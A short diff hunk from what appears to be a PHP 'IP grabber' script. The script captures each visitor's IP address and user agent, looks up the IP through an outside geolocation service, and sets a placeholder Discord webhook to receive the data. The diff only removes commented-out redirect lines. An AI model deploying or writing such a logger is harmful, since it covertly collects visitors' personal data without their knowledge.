@@ -3,8 +3,7 @@
 $ip = $_SERVER['REMOTE_ADDR'];
 $browser = $_SERVER['HTTP_USER_AGENT'];
 $url = "Your Discord Webhook Link Here";
-// If you want to redirect to another page, paste the link below and delete the //.
-// header("Location: http://example.com");
+
 
 $iplookup = file_get_contents("http://extreme-ip-lookup.com/json/{ip}");
 
